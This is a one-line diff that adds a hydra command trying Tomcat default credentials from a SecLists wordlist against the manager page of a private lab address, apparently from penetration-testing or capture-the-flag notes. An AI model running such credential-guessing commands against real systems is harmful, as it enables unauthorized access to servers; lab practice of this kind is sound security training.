@@ -1,0 +1,2 @@
+hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt http-get://192.168.56.29:8080/manager/html
+
